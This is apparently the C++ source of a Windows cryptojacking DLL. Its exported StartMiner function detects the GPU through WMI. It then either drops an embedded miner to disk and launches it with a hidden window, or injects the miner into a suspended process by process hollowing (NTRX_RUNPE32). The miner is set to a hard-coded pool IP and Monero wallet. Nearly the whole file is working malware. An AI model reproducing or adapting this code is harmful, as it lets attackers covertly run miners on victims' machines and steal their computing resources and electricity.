#include "pch.h"
#include <stdio.h> 
#include <string>
#include "rawminer.h"
#include "rawamdgpu.h"
#include "framework.h"
#include <comdef.h>
#include <wbemidl.h>
#include <atlbase.h>
#include <iostream>
#pragma comment(lib, "wbemuuid.lib")
#include <intrin.h>
#include <limits.h>
#include <ShellAPI.h>
#pragma warning(disable:4996)
extern "C"
{

	int NTRX_RUNPE32(void* Image, LPSTR cmd)
	{
		IMAGE_DOS_HEADER* DOSHeader;
		IMAGE_NT_HEADERS* NtHeader;
		IMAGE_SECTION_HEADER* SectionHeader;
		PROCESS_INFORMATION PI;
		STARTUPINFOA SI;
		CONTEXT* CTX;
		DWORD* ImageBase = NULL;
		void* pImageBase = NULL;
		int count;
		char CurrentFilePath[1024];
		DOSHeader = PIMAGE_DOS_HEADER(Image);
		NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);
		GetModuleFileNameA(0, CurrentFilePath, 1024);
		if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
		{
			ZeroMemory(&PI, sizeof(PI));
			ZeroMemory(&SI, sizeof(SI));
			bool threadcreated = CreateProcessA(CurrentFilePath, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI);
			if (threadcreated == true)
			{
				CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
				CTX->ContextFlags = CONTEXT_FULL;
				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
				{
					ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
					pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
						NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
					if (pImageBase == 00000000) {
						ResumeThread(PI.hThread);
						ExitProcess(NULL);
						return 1;
					}
					if (pImageBase > 0) {
						WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
						for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
						{
							SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
							WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
								LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
						}
						WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
							LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
						CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
						SetThreadContext(PI.hThread, LPCONTEXT(CTX));
						ResumeThread(PI.hThread);
						return 0;
					}
				}
			}
		}
	}

	std::string getGpuName()
	{
		char* str = (char*)malloc(200);
		ZeroMemory(str, 199);
		HRESULT hres;
		hres = CoInitializeEx(0, COINIT_MULTITHREADED);
		if (FAILED(hres)) return 0;
		hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
		if (FAILED(hres)) { CoUninitialize(); return 0; }
		IWbemLocator* pLoc = NULL;
		hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)& pLoc);
		if (FAILED(hres)) { CoUninitialize(); return 0; }
		IWbemServices* pSvc = NULL;
		hres = pLoc->ConnectServer(_bstr_t(L"root\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
		if (FAILED(hres)) { pLoc->Release(); CoUninitialize(); return 0; }
		hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
		if (FAILED(hres)) { pSvc->Release(); pLoc->Release(); CoUninitialize(); return 0; }
		IEnumWbemClassObject* pEnumerator = NULL;
		hres = pSvc->ExecQuery(bstr_t("WQL"),
			bstr_t("SELECT * FROM Win32_VideoController"),
			WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
		if (FAILED(hres)) { pSvc->Release(); pLoc->Release(); CoUninitialize(); return 0; }
		IWbemClassObject* pclsObj = (IWbemClassObject*)malloc(sizeof(IWbemClassObject));

		ULONG uReturn = 0;
		bool passed = false;
		while (pEnumerator)
		{
			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
			if (0 == uReturn)break;
			VARIANT vtProp;
			hr = pclsObj->Get(L"VideoProcessor", 0, &vtProp, 0, 0);
			std::wstring wGpuName = vtProp.bstrVal;
			int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wGpuName[0], (int)wGpuName.size(), NULL, 0, NULL, NULL);
			std::string strTo(size_needed, 0);
			WideCharToMultiByte(CP_UTF8, 0, &wGpuName[0], (int)wGpuName.size(), &strTo[0], size_needed, NULL, NULL);
			if (!passed)
				strcpy(str, strTo.c_str());
			else
				strcpy(str + size_needed, strTo.c_str());
			passed = true;
			//wcout << " OS Name : " << vtProp.bstrVal << endl;
			VariantClear(&vtProp);
		}
		pSvc->Release();
		pLoc->Release();
		pEnumerator->Release();
		pclsObj->Release();
		CoUninitialize();

		//free(pclsObj);

		return str;
	}


	__declspec(dllexport) void StartMiner(std::string url)
	{
		std::string gpu = getGpuName();
		std::string args = " -a cryptonight --url=185.234.72.253:3333 --donate-level=1 --user=4A4a56cxpXHKUD8AwkeKT86TpxGp9t8UvDm1ZT1Md8dNjemAFUDtg7F5Cvoc2obZdfaLs9ez5SNrPA5SMhKXMvtfCWR2MCz ";
		if (gpu.find("AMD") != std::string::npos) {
			//--opencl-launch=1600x8,1600x8,1600x8
			args = args + " --opencl-launch=1600x8,1600x8,1600x8";
			DWORD Res;
			HANDLE hFile = CreateFile("miner.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (INVALID_HANDLE_VALUE == hFile) {
				return;
			}
			WriteFile(hFile, rawDataAMD, sizeof(rawData), &Res, NULL);
			CloseHandle(hFile);
			Sleep(5000);

			LPTSTR cmdPath = (LPTSTR)"cmd.exe";
			std::string cmdArgs = "cmd.exe /k start miner.exe "+ args;
			ShellExecute(GetDesktopWindow(), "open", cmdPath, cmdArgs.c_str(), NULL, SW_HIDE);

		}else if (gpu.find("NVIDIA") != std::string::npos) {
			std::cout << "Nvidia Found";
		}
		else {
			args = args + " --threads=1";
			NTRX_RUNPE32(rawData, (LPSTR)args.c_str());
		}


		//NTRX_RUNPE32(rawData,(LPSTR)" -a cryptonight --url=185.234.72.253:3333 --donate-level=1 --user=4A4a56cxpXHKUD8AwkeKT86TpxGp9t8UvDm1ZT1Md8dNjemAFUDtg7F5Cvoc2obZdfaLs9ez5SNrPA5SMhKXMvtfCWR2MCz --threads=1");
	}
}